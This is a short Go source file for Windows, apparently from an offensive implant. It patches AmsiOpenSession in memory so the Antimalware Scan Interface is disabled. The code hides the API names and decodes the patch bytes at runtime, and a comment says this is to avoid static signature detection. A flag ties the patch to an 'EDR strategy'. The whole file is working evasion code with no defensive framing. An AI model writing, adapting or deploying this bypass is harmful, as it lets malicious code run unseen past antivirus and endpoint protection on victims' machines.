//go:build windows
// +build windows

package main

import (
	"syscall"
	"unsafe"
)

func amsiSessionBypass() string {
	if !patchAMSI {
		return "AMSI session bypass: disabled by EDR strategy"
	}
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc(s(SProcGModuleW))
	getProcAddress := k32.NewProc(s(SProcGProcAddr))
	virtualProtect := k32.NewProc(s(SProcVProtect))

	namePtr, _ := syscall.UTF16PtrFromString("amsi.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "AmsiOpenSession bypass: amsi.dll not loaded"
	}

	// Patch AmsiOpenSession to return immediately
	procName := append([]byte("AmsiOpenSession"), 0)
	procAddr, _, _ := getProcAddress.Call(hMod, uintptr(unsafe.Pointer(&procName[0])))
	if procAddr == 0 {
		return "AmsiOpenSession not found"
	}

	// Decode patch bytes at runtime to avoid static signature {0x31, 0xC0, 0xC3}
	patch := decodeBypassPatch()

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(procAddr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "AmsiOpenSession bypass: VirtualProtect failed"
	}

	// Patch AmsiOpenSession prologue: write XOR,INC;RET to return S_OK immediately
	for i := 0; i < len(patch); i++ {
		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
	}

	return "AmsiOpenSession bypass: patched → returns S_OK"
}
